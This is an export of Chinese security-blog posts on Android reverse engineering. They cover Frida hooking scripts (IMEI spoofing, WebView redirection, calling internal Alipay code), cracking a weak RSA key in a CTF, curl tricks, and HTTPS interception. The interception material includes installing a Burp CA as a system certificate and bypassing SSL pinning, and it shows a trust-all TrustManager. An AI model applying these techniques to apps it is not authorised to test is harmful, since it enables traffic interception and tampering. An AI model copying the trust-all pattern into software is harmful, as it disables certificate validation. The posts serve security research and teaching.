参考文档： 使用lief和libfuzzer进行fuzz https://blahcat.github.io/2018/03/11/fuzzing-arbitrary-functions-in-elf-binaries/ https://github.com/lief-project/LIEF https://lief.quarkslab.com/doc/#tutorials]]></content>
  </entry>
  <entry>
    <title><![CDATA[Android Hook 之 Frida]]></title>
    <url>%2F2018%2F03%2F09%2FAndroid-Hook-%E2%80%94%E2%80%94-Frida%2F</url>
    <content type="text"><![CDATA[Frida简介Frida是一款基于python + javascript 的hook框架，通杀android\ios\linux\win\osx等各平台，由于是基于脚本的交互，相比xposed和substrace cydia更加便捷，本文重点介绍Frida在android下面的使用。 Frida的官网为：http://www.frida.re/ 环境配置 pip install frida 安装frida环境 在root的手机上运行frida server端 wget https://build.frida.re/frida/android/arm/bin/frida-server adb push frida-server /data/lcoal/tmp chmod 755 frida-server ./frida-server &amp; adb forward adb forward tcp:27042 tcp:27042 adb forward tcp:27043 tcp:27043 完成配置，直接在PC端运行hook脚本即可 需要注意的是，frida的客户端和服务度版本应该相同，否则会出现不可预知的其他错误。1frida --version 查看版本 免root实现frida hook（重打包） apktool反编译apk 1$ apktool d test.apk -o test 将对应版本的gadget拷贝到/lib没有了下.例如arm32的设备路径如下. /lib/armeabi/libfrida-gadget.so下载地址:https://github.com/frida/frida/releases/ smali注入加载library,选择application类或者Activity入口. 1const-string v0, &quot;frida-gadget&quot; invoke-static &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V 如果apk没有网络权限需要在配置清单中加入如下权限申明 1&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt; 回编译apk 1$ apktool b -o newtest.apk test/ 重新签名安装运行.成功后启动app会有如下日志 Frida: Listening on TCP port 27042 实现hook以下为frida hook的框架代码，只需要修改jscode就可以实现自定义的hook12345678910111213141516171819202122232425262728293031323334import frida, sysdef on_message(message, data): if message[&apos;type&apos;] == &apos;send&apos;: print(&quot;[*] &#123;0&#125;&quot;.format(message[&apos;payload&apos;])) else: print(message)jscode = &quot;&quot;&quot;Java.perform(function () &#123; // 要hook的类名 var MainActivity = Java.use(&apos;com.example.xxx.MainActivity&apos;); // hook按钮点击事件 MainActivity.onClick.implementation = function (v) &#123; // Show a message to know that the function got called send(&apos;onClick&apos;); // 执行原始方法代码 this.onClick(v); //修改MainActivity中属性的值 this.m.value = 0; this.n.value = 1; this.cnt.value = 999; //打印日志 console.log(&apos;Done:&apos; + JSON.stringify(this.cnt)); &#125;;&#125;);&quot;&quot;&quot;# 设置要注入的进程名或者pidprocess = frida.get_usb_device().attach(&apos;com.example.seccon2015.rock_paper_scissors&apos;)script = process.create_script(jscode)script.on(&apos;message&apos;, on_message)print(&apos;[*] Running CTF&apos;)script.load()sys.stdin.read() 采坑记录 需要自己注意脚本加载时机 app启动后进行attach.可以使用-f参数frida来生成已经注入的进程(先注入Zygote为耗时操作),通常配合–no-pause使用. 1frida -U -f com.tencent.tmgp.pubgmhd -l chiji.js hook不上的原因？ 要hook的函数是不是正好被打了热补丁？ hook的进程是否正确，比如com.tencent.mm有好几个进程 hook中可能出现“函数名参数完全相同，但返回值不同的情况”，这种情况frida暂时无法实现，收到测试此情况代码编译不会通过，但编译后可以改bytecode，不影响执行结果 这种情况可以枚举函数的overloads属性，挨个hook，或者使用数组索引hook,例如a.overloads[1].implement=xxxx 使用enumerateLoadedClasses报“VM::GetEnv failed”错误enumerateLoadedClasses需要在Java.perform（）下使用，参考https://github.com/frida/frida/issues/237 Failed to spawn: unable to find application with identifier ‘com.dzvuhumnjt.kfwmalytfds’如果包名是正确的，应该是这个包名是一个服务，没有lunch activity, 此时只能靠启动后抢时间的方式来attach, spawn行不通 Frida 基础数据类型Int12var Integerclass = Java.use(&quot;java.lang.Integer&quot;);var myint = Integerclass.$new(1440); Long12var Longclass = Java.use(&quot;java.lang.Long&quot;);var myint = Longclass.$new(27893952512) ByteArray js传给python 123456789// js中send（byte[]数组）def on_message(message, data): if message[&apos;type&apos;] == &apos;send&apos;: data = message[&apos;payload&apos;] for i in range(len(data)): data[i] = data[i] &amp; 0xff open(&quot;tmp&quot;,&apos;wb&apos;).write(bytearray(data)) else: pass python传给js 1var a = Java.array(&apos;byte&apos;, [ 0xac,0x37,0x43,0x4f,0xaf,0xa8]); Frida Hook实例以下为我曾经用过或自己实现的frida脚本，主要适用于Android平台，根据不同的使用场景进行了分类，如需获取更多的使用或脚本，请参考awesome-frida，该项目搜集了各种通过frida实现的hook需求，并且不分区平台 https://github.com/dweinstein/awesome-frida 1. 打印hook函数的返回值直接运行一遍原函数，将结果赋值给一个新变量，输出并return新变量即可，例如： 12345678Java.perform(function () &#123; var cls = Java.use("com.tencent.mm.sdk.platformtools.w"); cls.w.overload("java.lang.String","java.lang.String").implementation=function(p1,p2)&#123; var req = this.w(p1,p2); console.log(req); return req;&#125;;&#125;); 2. hook重载函数12cls.loadUrl.overload(&quot;java.lang.String&quot;).implementation = function(param)……cls.loadUrl.overload(&quot;java.lang.String&quot;,&quot;java.util.Map&quot;).implementation= 3. 打印java函数的调用栈1234567var Exc = Java.use(&quot;java.lang.Exception&quot;);var Log = Java.use(&quot;android.util.Log&quot;);xxxx.implementation = function(param)&#123; var e = Exc.$new(&quot;&quot;); var log = Log.$new(); console.log(log.getStackTraceString(e)); &#125;; 4. 打印native函数调用栈123456789101112131415console.log("begin====");var libavmp = Module.findBaseAddress("libsgavmpso-6.4.20.so");var func = ptr(parseInt(libavmp)+0x1ea);console.log("libavmp base: "+libavmp);console.log("function base: "+func);Interceptor.attach(func, &#123; onEnter: function(args) &#123; console.log(Thread.backtrace(this.context,Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join(" ")); &#125;, onLeave:function(retval)&#123; console.log("retval: "+retval); &#125; &#125;); 5. dump内存12var data = Memory.readByteArray(ptr(0x824a9000), 159744);console.log(&#123;type: &apos;data-for-you&apos; &#125;, data); 6. Hook Android IMEI12345678910111213141516171819Java.perform(function () &#123;var TM = Java.use(&quot;android.telephony.TelephonyManager&quot;);console.log(&quot;hook start...&quot;); TM.getSimSerialNumber.overload().implementation = function () &#123; console.log(&quot;Called - getSimSerialNumber(String)&quot;); var temp = this.getSimSerialNumber(); console.log(temp); return &quot;123456789&quot;; &#125;; TM.getDeviceId.overload().implementation = function () &#123; console.log(&quot;Called - deviceID()&quot;); var temp = this.getDeviceId(); console.log(temp); return &quot;867979021642856&quot;; &#125;;&#125;); 7. Hook Android webview http请求主要针对以下webview中的以下函数： 12345- loadUrl(String url) - loadUrl(String url, Map&lt;String, String&gt; additionalHttpHeaders)- loadData(String data, String mimeType, String encoding)- loadDataWithBaseURL(String baseUrl, String data, String mimeType, String encoding, String historyUrl)- postUrl(String url, byte[] postData) 123456789101112131415161718192021222324252627Java.perform(function () &#123;var cls = Java.use(&quot;android.webkit.WebView&quot;);console.log(&quot;class start:------------------&quot;); cls.loadUrl.overload(&quot;java.lang.String&quot;).implementation = function(param)&#123; console.log(&quot;loadUrl hooked &quot;+param); this.loadUrl(&quot;file:///sdcard/1.html&quot;); &#125;;cls.loadUrl.overload(&quot;java.lang.String&quot;,&quot;java.util.Map&quot;).implementation = function(p1,p2)&#123; console.log(&quot;loadUrl2 hooked&quot;+p1 + p2); this.loadUrl(&quot;file:///sdcard/1.html&quot;,null); &#125;;cls.loadDataWithBaseURL.implementation = function(p1,p2,p3,p4,p5)&#123; console.log(&quot;loadDataWithBaseURL hooked&quot;+p1 + p2); this.loadDataWithBaseURL(&quot;file:///sdcard/1.html&quot;,null,null,null,null); &#125;;cls.postUrl.implementation = function(p1,p2)&#123; console.log(&quot;postUrl hooked&quot;+p1); this.postUrl(&quot;file:///sdcard/1.html&quot;,null); &#125;;&#125;); 8. 获取context12var currentApplication = Java.use(&apos;android.app.ActivityThread&apos;).currentApplication();var context = currentApplication.getApplicationContext(); 9. 创建bundle对象123456789var bundle = Bundle.$new();//调用实例方法需要使用callBundle.putString.call(bundle,&apos;key1&apos;,&apos;value1&apos;)//也可以指定具体的参数类型//Bundle.putString.overload(&apos;java.lang.String&apos;,&apos;java.lang.String&apos;).call(bundle,&apos;key1&apos;,&apos;value1&apos;)this.getIntent().putExtra(&apos;testBundle&apos;,bundle)//activity.getIntent().getBundleExtra(&quot;testBundle&quot;);var outB = this.getIntent().getBundleExtra(&apos;testBundle&apos;)console.log(outB); 10. hook 对象1234567//读取实例对象的属性值，对于得到的对象，需要使用Java.cast()方法转换后才可以使用// PackageInfo packageInfo = getPackageManager().getPackageInfo(getPackageName(),0);// String pkg = packageInfo.packageName;var t = this.getPackageManager().getPackageInfo(this.getPackageName(),0);var packageInfo = Java.cast(t.$handle, PackageInfo);var pkg = packageInfo.packageName.valueconsole.log(pkg) 11. 导出函数并被任意调用123456789101112131415161718192021222324252627282930313233343536rdev = frida.get_remote_device()session = rdev.attach(&quot;com.eg.android.AlipayGphone&quot;)jscode=&quot;&quot;&quot;rpc.exports = &#123; myfunc: function(aa,bb,cc)&#123; Java.perform(function () &#123; try&#123; classf = Java.use(&apos;com.alipay.android.phone.wallet.sharetoken.service.f&apos;); var result = classf.a(aa,bb,cc);//a为static函数 //f = Hrida.$new(); 非static函数需要new一个实例 console.log(&quot;myfunc result: &quot;+result); return result.toString() &#125;catch(e)&#123; console.log(e) &#125; &#125;); //return result &#125;&#125;&quot;&quot;&quot;script = session.create_script(jscode)script.on(&quot;message&quot;, my_message_handler)script.load()command = &quot;&quot;while 1 == 1: command = raw_input(&quot;Exit: 9999 0: default others: zhikouling&quot;) if command == &quot;9999&quot;: break else: a = &quot;b54578ff9d5fcbf6&quot; b = None c = &quot;快来吱付寳&quot; script.exports.myfunc(a,b,c) 12. hook构造函数12obj.$init.implementation = function ()&#123;&#125; 13.枚举所有加载的类12345678910Java.enumerateLoadedClasses(&#123; onMatch: function(classname)&#123; if (classname.indexOf(&quot;XmlPullParser&quot;)&gt;-1)&#123; console.log(classname); &#125; &#125;, onComplete: function ()&#123; &#125; &#125;); 其他参考 https://github.com/FloatingGuy/fg-Blog/blob/7df0bd47b42d11b787fe394259fa30288307ae48/source/_posts/%E5%BC%80%E5%8F%91/frida%20hook%20%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C.md]]></content>
  </entry>
  <entry>
    <title><![CDATA[RSA算法原理及应用破解]]></title>
    <url>%2F2018%2F03%2F06%2FRSA%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[前言RSA算法是现今使用广泛的公钥密码算法，也是号称地球上最安全的加密算法。在了解RSA算法之前，先熟悉下几个术语根据密钥的使用方法，可以将密码分为对称密码和公钥密码对称密码：加密和解密使用同一种密钥的方式公钥密码：加密和解密使用不同的密码的方式，因此公钥密码通常也称为非对称密码。 RSA算法原理该部分转自http://blog.csdn.net/dbs1215/article/details/48953589 RSA加密RSA的加密过程可以使用一个通式来表达，也就是说RSA加密是对明文的E次方后除以N后求余数的过程。 从通式可知，只要知道E和N任何人都可以进行RSA加密了，所以说E、N是RSA加密的密钥，也就是说E和N的组合就是公钥，我们用(E,N)来表示公钥不过E和N不并不是随便什么数都可以的，它们都是经过严格的数学计算得出的，关于E和N拥有什么样的要求及其特性后面会讲到。顺便啰嗦一句E是加密（Encryption）的首字母，N是数字（Number）的首字母 RSA解密RSA的解密过程也可以使用一个通式来表达，即对密文的D次方后除以N后求余数的过程。 这就是RSA解密过程。知道D和N就能进行解密密文了，所以D和N的组合就是私钥。 总结如下表： 生成秘钥对既然公钥是（E，N），私钥是（D，N）所以密钥对即为（E，D，N）但密钥对是怎样生成的？ 密钥对生成分求N、求L（L为中间过程的中间数,详见下文描述）、求E和求D以下几个步骤： 求N准备两个质数p，q。这两个数不能太小，太小则会容易破解，将p乘以q就是N 求L（L为中间过程的中间数）L 是 p－1 和 q－1的最小公倍数，可用如下表达式表示： 求EE必须满足两个条件：E是一个比1大比L小的数，E和L的最大公约数为1用gcd(X,Y)来表示X，Y的最大公约数则E条件如下： 之所以需要E和L的最大公约数为1是为了保证一定存在解密时需要使用的数D。现在我们已经求出了E和N也就是说我们已经生成了密钥对中的公钥了。 求D数D是由数E计算出来的。D、E和L之间必须满足以下关系： 只要D满足上述2个条件，则通过E和N进行加密的密文就可以用D和N进行解密。简单地说条件2是为了保证密文解密后的数据就是明文。现在私钥自然也已经生成了，密钥对也就自然生成了。 生成秘钥对总结如下： 实践举例5.1 求N我们准备两个很小对质数，p ＝ 17q ＝ 19N ＝ p ＊ q ＝ 323 5.2 求LL ＝ lcm（p－1， q－1）＝ lcm(16，18） ＝ 144144为16和18对最小公倍数 5.3 求E求E必须要满足2个条件：1 &lt; E &lt; L ，gcd（E，L）=1即1 &lt; E &lt; 144，gcd（E，144） ＝ 1E和144互为质数，5显然满足上述2个条件故E ＝ 5 此时公钥=(E，N）＝ （5，323） 5.4 求D求D也必须满足2个条件：1 &lt; D &lt; L，E＊D mod L ＝ 1即1 &lt; D &lt; 144，5 ＊ D mod 144 ＝ 1显然当D＝ 29 时满足上述两个条件1 &lt; 29 &lt; 1445＊29 mod 144 ＝ 145 mod 144 ＝ 1此时私钥＝（D，N）＝（29，323） 5.5 加密准备的明文必须时小于N的数，因为加密或者解密都要mod N其结果必须小于N假设明文 ＝ 123则 密文＝明文EmodN＝1235mod323=2255.6 解密明文＝密文DmodN＝22529mod323=123解密后的明文为123。 一个直观的解释如下： 123的5次方mod323==Math.pow(123d, 5d) % 323d可以直接计算出是225；再说5.6:因为225的29次方数值太大，直接运算会导致取模结果获取错误结果；可以这样求解(225的5次方mod323)==4;(225的4次方mod323)==290所以225的29次方mod323==(225的5次方mod323)(225的5次方mod323)(225的5次方mod323)(225的5次方mod323)(225的5次方mod323)(225的4次方mod323) mod323==(4 4 4 4 290 4) % 323==123 RSA实现破解RSA在软件逆向或加解密类的ctf题目中经常看到。在实际应用中，参数N和E是公开的但是D是私有的并且绝不能公开！两个大素数P和Q在生成密钥后便不再需要了，但是必须销毁，否则就可以推算出D。 为了从公钥(N,E)得到D,需要试图分解N为它的两个素数因子。对于一个很大的模数N（512位或更大）要想分解出它的P和Q是件非常困难的事。 ctf题目一题目：给出密文flag.enc和公钥public.pem,解出密文解题过程如下： openssl分析公钥，得到N,E1openssl rsa -pubin -text -modulus -in public.pem 其中，Modulus 是n的值，Exponent是E的值。 使用msieve工具对N进行分解1msieve.exe 0xA41006DEFD378B7395B4E2EB1EC9BF56A61CD9C3B5A0A73528521EEB2FB817A7 -v 分解结果如下： Msieve v. 1.53 (SVN 1005)Wed Feb 28 23:00:33 2018random seeds: f922db80 d61d4d18factoring 74207624142945242263057035287110983967646020057307828709587969646701361764263 (77 digits)searching for 15-digit factorscommencing quadratic sieve (77-digit input)using multiplier of 7using generic 32kb sieve coresieve interval: 12 blocks of size 32768processing polynomials in batches of 17using a sieve bound of 921409 (36471 primes)using large prime bound of 92140900 (26 bits)using trial factoring cutoff of 26 bitspolynomial ‘A’ values have 10 factorsrestarting with 19771 full and 188452 partial relations 36803 relations (19771 full + 17032 combined from 188452 partial), need 36567sieving complete, commencing postprocessingbegin with 208223 relationsreduce to 51729 relations in 2 passesattempting to read 51729 relationsrecovered 51729 relationsrecovered 38607 polynomialsattempting to build 36803 cyclesfound 36803 cycles in 1 passesdistribution of cycle lengths: length 1 : 19771 length 2 : 17032largest cycle: 2 relationsmatrix is 36471 x 36803 (5.3 MB) with weight 1102159 (29.95/col)sparse part has weight 1102159 (29.95/col)filtering completed in 3 passesmatrix is 24858 x 24922 (4.0 MB) with weight 836197 (33.55/col)sparse part has weight 836197 (33.55/col)saving the first 48 matrix rows for latermatrix includes 64 packed rowsmatrix is 24810 x 24922 (2.6 MB) with weight 611256 (24.53/col)sparse part has weight 439905 (17.65/col)commencing Lanczos iterationmemory use: 2.7 MBlanczos halted after 394 iterations (dim = 24805)recovered 14 nontrivial dependenciesp39 factor: 258631601377848992211685134376492365269p39 factor: 286924040788547268861394901519826758027elapsed time 00:00:06 两个p39 factor为p和q,这里是10进制表示 生成私钥知道了N，e,p,q，就可以生成私钥了123456789101112131415161718192021222324import mathimport sysfrom Crypto.PublicKey import RSAkeypair = RSA.generate(1024)keypair.p = 0xD7DB8F68BCEC6D7684B37201385D298Bkeypair.q = 0xC292A272E8339B145D9DF674B9A875D5keypair.e = 65537keypair.n = keypair.p * keypair.qQn = long((keypair.p-1) * (keypair.q-1))i = 1while (True): x = (Qn * i ) + 1 if (x % keypair.e == 0): keypair.d = x / keypair.e break i += 1private = open(&apos;private.pem&apos;,&apos;w&apos;)private.write(keypair.exportKey())private.close() 注：生成的私钥会默认base64加密。 密钥解密密文123openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.txtcat flag.txt ISG&#123;256bit_is_weak&#125; 附：常用工具下载地址RSA-tool 2 http://www.skycn.net/soft/appid/39911.html msieve https://sourceforge.net/projects/msieve/ yafu https://sourceforge.net/projects/yafu/]]></content>
  </entry>
  <entry>
    <title><![CDATA[curl用法]]></title>
    <url>%2F2018%2F03%2F06%2Fcurl%E7%94%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[批量下载 -O表示下载后的文件名和服务端的文件名一样curl -O http://45.77.10.219/2018-02-2[6-8].html -o指定下载后的文件名curl -o “#1.html” http://45.77.10.219/2018-02-2[6-8].html(#1表示可变参数，该命令结果为6.html,7.html,8.html) 模拟请求获取服务器http头信息curl -i https://www.baidu.com 添加User-Agentcurl -i -A “Mazilla/4.0 (compatible;MSIE 6.0;Windows NT5.0)” https://www.baidu.com 使用代理curl -x 114.115.140.25:3128 https://www.google.com 指定refer对于验证refer的服务器，如防止倒链等可以指定refercurl -e ‘http://www.baidu.com‘ https://map.baidu.com 设置访问域名的主机头突破服务器端限制在某些情况下服务器可能禁止通过IP直接访问，或者与需要通特定的域名、主机头才能访问你需要访问的内容，但是此域名DNS还没有解析，或者DNS解析的域名是多个IP，，不能到你需要的IP，你需要让它解析成你需要的特定IP。 curl –header “Host:www.freebuf.com” http://127.0.0.1 在较新版本的curl还支持一个为例子显示下：–resolve的选项，可以直接用来指定对url的解析 curl –resolve www.freebuf.com:80:127.0.0.1 http://www.freebuf.com 设置POST表单实现web认证找到登录页的表单，获取用户名和密码的表单值，例如为user何pass curl -d “user=name&amp;pass=pass” 登陆URL 带cookie访问1231.curl -D cookiename -d “user=name&amp;pass=pass” https://www.xxx.com （通过口令获取cookie，并保存为文件）2.cat cookie 验证下cookie3.curl -b cookiename https://www.xxx.com (带着cookie访问) 文件上传例如对于如下表单：1curl -F "file=@local_a.txt;filename=testaaabcd.txt" http://www.a.com/file 上传文件，local_a.txt为本地路径，文件名称为testaaabcd.txt]]></content>
  </entry>
  <entry>
    <title><![CDATA[Android Https抓包实践]]></title>
    <url>%2F2018%2F03%2F05%2Fhttps%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[平时的安全研究经常会有抓包的需求，随着互联网厂商安全意识的不断提高，多数Android APP采用了https协议和服务端进行通信，增加了中间人攻击的难度。 在使用burpsuilt、Fiddler等工具抓https数据包时，通常需要在手机上安装一个证书，即便这样仍然还会出现抓不到包等各种各样的错误和问题，为了解决这些问题，有必要了解下https的原理和实现，方可在遇到问题时根据不同的情况来解决。 文章有点长，搞个图便于以后采坑定位： 什么是证书这里的证书是指https数字证书，为了防止被中间人挟持，整个互联网都在由http向https切换，证书是https协议中的一个重要角色，本质上证书被用来验证“一个站点是不是真正的站点”。下图是https的协议过程，其中第4阶段就是证书的校验阶段 那么如何通过证书来验证“一个站点是不是真正的站点”呢？首先从证书的内容说起。 使用openssl可以查看证书的内容，例如：12345678910111213141516171819202122232425262728293031323334353637383940openssl x509 -noout -text -in kubernetes.pemCertificate: Data: Version: 3 (0x2) Serial Number: 06:6c:9f:d7:c1:bb:10:4c:29:43:e5:71:7b:7b:2c:c8:1a:c1:0e Signature Algorithm: ecdsa-with-SHA384 Issuer: C=US, O=Amazon, CN=Amazon Root CA 4 Validity Not Before: May 26 00:00:00 2015 GMT Not After : May 26 00:00:00 2040 GMT Subject: C=US, O=Amazon, CN=Amazon Root CA 4 Subject Public Key Info: Public Key Algorithm: id-ecPublicKey Public-Key: (384 bit) pub: 04:d2:ab:8a:37:4f:a3:53:0d:fe:c1:8a:7b:4b:a8: 7b:46:4b:63:b0:62:f6:2d:1b:db:08:71:21:d2:00: e8:63:bd:9a:27:fb:f0:39:6e:5d:ea:3d:a5:c9:81: aa:a3:5b:20:98:45:5d:16:db:fd:e8:10:6d:e3:9c: e0:e3:bd:5f:84:62:f3:70:64:33:a0:cb:24:2f:70: ba:88:a1:2a:a0:75:f8:81:ae:62:06:c4:81:db:39: 6e:29:b0:1e:fa:2e:5c ASN1 OID: secp384r1 NIST CURVE: P-384 X509v3 extensions: X509v3 Basic Constraints: critical CA:TRUE X509v3 Key Usage: critical Digital Signature, Certificate Sign, CRL Sign X509v3 Subject Key Identifier: D3:EC:C7:3A:65:6E:CC:E1:DA:76:9A:56:FB:9C:F3:86:6D:57:E5:81 Signature Algorithm: ecdsa-with-SHA384 30:65:02:30:3a:8b:21:f1:bd:7e:11:ad:d0:ef:58:96:2f:d6: eb:9d:7e:90:8d:2b:cf:66:55:c3:2c:e3:28:a9:70:0a:47:0e: f0:37:59:12:ff:2d:99:94:28:4e:2a:4f:35:4d:33:5a:02:31: 00:ea:75:00:4e:3b:c4:3a:94:12:91:c9:58:46:9d:21:13:72: a7:88:9c:8a:e4:4c:4a:db:96:d4:ac:8b:6b:6b:49:12:53:33: ad:d7:e4:be:24:fc:b5:0a:76:d4:a5:bc:10 客户端通过证书来验证服务端的合法性，包括： 1. 验证证书的颁发机构是否受浏览器信任 2. 验证证书的有效期 3. 验证部署SSL证书的网站域名与证书颁发的域名是否一致 等等。 到这里可能有些晕了，证书本来就在客户端放着，怎么自己校验自己？其实https协议中的证书分服务端证书和客户端证书，部署https环境的时候会要求生成这两个证书，证书校验是指用“客户端的证书来校验服务端的证书”，他们两个是PKI体系，客户端证书里有一个字段是CA的公钥，用于解开服务端证书的内容以进行下一步的校验。 通常，在浏览器中会内置一些根证书，如果网站的证书是这些信任根发的或者信任根的二级证书机构颁发的，那么浏览器才会同服务器发起ssl连接。如果验证失败，则拒绝连接。证书的校验包括证书是否过期、域名和服务器域名是否一致等等，由于用户只是作为浏览网页的角色，这些校验功能由浏览器或操作系统的内置代码来完成。 不同于浏览器，APP除了靠系统或浏览器，还可以自己实现代码来校验证书，因此在APP中证书校验通常存在三种情况： APP通过系统和浏览器校验证书； APP自己校验证书，也叫证书绑定； APP除了校验服务端的证书，服务端还可以校验APP的证书，即https双向校验； 本文主要基于Android平台对以上三种情况下的中间人攻击（抓包）进行分析。 Android平台下https抓包实践对于中间人来说，能成功攻击的核心在于“如何让客户端认为我是服务端？”。在现有https协议不变的情况下，中间人既要当真实客户端的“服务者”，又要当真实服务端的“客户”，作为https协议下的“服务者”，自然是需要给客户端提供证书的，因此，在有证书校验的前提下，问题就变成了“如何让客户端信任中间人的证书？” 我们将根据上述三种情况分别分析： 1. APP通过系统和浏览器校验证书由于证书校验是由系统或浏览器完成，那么只需要系统或浏览器信任中间人的证书即可，现有的操作系统或浏览器都有导入可信证书的功能，因此通过这些功能直接导入中间人的证书即可，这也解释了为什么burpsuilt、Fiddler等工具在抓包时需要往手机里导入一个证书，信任了证书后的攻击过程就由这些工具来搞定了。这里以burpsuit为例，贴出在Android上导入burp证书的方法： （1）从设置中手动导入证书 1.代理都设置开启好之后，在浏览器访问http://burp ，点击”CA Certificate”下载证书-“cacert.der” 2.重命名cacert.der 为cacert.cer或cacert.crt，并导入到手机 由于android 只支持导入以.crt 或.cer 后缀的文件形式保存的PEM格式或DER格式的证书(这里注意区分后缀和格式)，如下图所示。而burp导出的证书是DER后缀的DER格式，因此需要重命名为.crt或.cer后缀。很多文章说要用firfox或openssl等工具转换一下格式，其实只要换一个后缀就行了，详情可以参考burp官方教程https://support.portswigger.net/customer/portal/articles/1841102-installing-burp-s-ca-certificate-in-an-android-device12//使用openssl转换证书格式，这里不需要了但还是贴一下吧openssl x509 -inform PEM -outform DER -in ca_cert.crt -out ca_cert_der.crt 3.安装证书设置-&gt; 安全-&gt; 用户凭据 -&gt; 从存储设备安装（证书），选择刚导入到手机里的证书即可。需要注意的是必须要设置锁屏密码才可以。 完成后在设置-&gt; 安全-&gt; 用户凭据 -&gt;信任的凭据 中可查看刚刚安装的证书。 之后，配置好客户端的代理ip和端口就可以抓包了。 然而，安卓7.0之后有了network-security-config选项参考Android开发文档，当app支持的最小API为24（Android 7.0）或以上时(并非7.0以上的手机)，默认情况下app只信任系统级别的CA，这样从sdcard安装Burp证书将无法拦截应用流量，于是就需要把burp证书变为系统证书。这里有两种方法可以帮我们绕过：1.将Burp CA作为系统级CA安装在设备上。这是最简单的解决方法，但需要root2.修改manifest文件并重打包，比较麻烦，但无需root。 这里介绍一下第1种方法。 （2）root下导入证书为系统证书有root的前提下，可以把我们自己的证书安装成系统证书，主要步骤如下： 1.转为PEM格式 1openssl x509 -inform der -in burp.der -out burp.pem 2.计算证书哈希值： 1openssl x509 -inform PEM -subject_hash_old -in burp.pem|head -1 假设结果是80326040，则我们把证书重命名为80326040.0。 3.把/system mount成为可读可写。 1mount -o rw,remount /system 4.把80326040.0拷贝到Android的路径/system/etc/security/cacerts/下，添加644权限： 123chmod 644 80326040.0chown root:root 80326040.0reboot 5.重启手机后生效（切记） Android的系统证书路径为“/system/etc/security/cacerts/”，用户证书路径为“/data/misc/user/0/cacerts-added”，所以把用户证书move到系统证书路径也是可以的。12345mount -o rw,remount /systemmv /data/misc/user/0/cacerts-added/xxxx.0 /system/etc/security/cacerts/chmod 644 xxxx.0chown root:root xxxx.0reboot Magisk有一个插件叫movecert(https://github.com/Magisk-Modules-Repo/movecert),其原理就是如此。所以不想那么复杂，直接安装Magisk的这个模块后，导入用户证书后重启手机即可变为系统证书。 （3）证书有效期过长的问题然而，我在oneplus 5T 和HTC的手机（均为8.0以上系统）通过导入burp证书为系统证书，仍然无法抓到https数据，浏览器报“NET::ERR_CERT_VALIDITY_TOO_LONG”错误，这是为什么呢？ 原因是chrome从2018年开始只信任有效期少于825天（27个月）的证书（参考https://www.ssl.com/blogs/ssl-certificate-maximum-duration-825-days/），而burp发行的root证书有效期远大于27个月，在Android 7以上，即使把burp的自定义证书添加进系统证书里（但用户证书并不会检测这个有效期是否太长），这个证书也是不工作的，所以chrome会判定这个证书无效，报ERR_CERT_VALIDITY_TOO_LONG的错误。 解决的办法是自己做一个低于27个月的root证书导入burp，再通过burp重新导出证书放到系统证书路径下。这也是在（1）和（2）都无法抓包的条件下的终极解决方案。 下面来介绍如何生成root CA证书： 生成密钥 1openssl genrsa -out key.pem 3072 -nodes 下载openssl.cnf (OpenSSL example configuration file,下载链接：https://gist.github.com/nevermoe/f1a4bbcd9cf76143e9520c717caff306) 并使用如下命令生成证书： 1openssl req -new -x509 -key key.pem -sha256 -config openssl.cnf -out cert.pem -days 730 -subj &quot;/C=JP/ST=/L=/O=m4bln/CN=MY CA&quot; 把密钥和证书导出成pfx格式 1openssl pkcs12 -export -inkey key.pem -in cert.pem -out cert_and_key.pfx 把cert_and_key.pfx导入burp注意：需要输入创建时的密码 导出证书，并按照（2）中的方法把导出证书变为系统证书。 需要注意的是自签名的root证书一定要有x509v3 extesion，其中包含了CA： True这个属性，不然我们生成的证书是无法导入成系统证书的。 至此，依靠系统或默认浏览器校验证书的抓包方法就到此为止了，为了更清楚的搞清楚各种方法的使用场景，这里简单总结一下： 在依靠系统或默认浏览器校验证书的情况下，导入burp证书为用户证书是可以抓https包的 当app支持的最小API为24（Android 7.0）或以上时，默认情况下app只信任系统级别的证书，需要把burp变为系统证书 自签名证书作为系统证书时，有效期最长不超过825天，用户证书则没有限制 总之，如果不想那么麻烦的话，不妨直接采用方案（3）作为终极方案。 2. APP自己校验证书（SSL Pinning）如果APP自己实现证书校验时，证书验证的逻辑在app内部，与系统和浏览器无关，因此导入为用户证书或系统证书都解决不了问题。 APP自己校验证书，通常会把自己的证书或证书的hash值内置在APK安装包内，在发请求时app自身通过代码来校验证书和服务器的关系，即证书绑定(也叫Certificate Pinning或SSL Pinning)。 这种情况下如果想抓https数据包，我们有两种解决办法： 替换证书或证书的hash 通过hook绕过证书的校验逻辑 由于方案一需要找到证书的位置或hash值所在的代码片段，并进行重打包和签名，操作起来比较复杂且不通用，这里我们主要采用方案2。 通过hook绕过ssl pinning(即ssl unpinning)比较成熟的工具主要有JustTrustMe（https://github.com/Fuzion24/JustTrustMe）和DroidSSLUnpinning（https://github.com/WooyunDota/DroidSSLUnpinning）。二者的原理均为hook常用证书校验的API，不同的是前者基于Xposed，后者基于Frida。 下边我们基于Android中常见的证书绑定的的实现，来讨论绕过方法。 证书绑定实例及绕过方法（1）使用TrustManager1234567891011TrustManager[] trustAllCerts = new TrustManager[] &#123; new X509TrustManager() &#123; public java.security.cert.X509Certificate[] getAcceptedIssuers() &#123; return null; &#125; public void checkClientTrusted(X509Certificate[] certs, String authType) &#123; &#125; public void checkServerTrusted(X509Certificate[] certs, String authType) &#123; &#125; &#125;&#125;; TrustManager是android用来处理证书的一个类，其子类X509TrustManager实现了各种校验。它会被SSLcontext的init函数调用并传给上层处理。123SSLContext sslContext = SSLContext.getInstance(&quot;TLS&quot;);sslContext.init(null, trustManagerFactory.getTrustManagers(), new SecureRandom());return sslContext.getSocketFactory(); 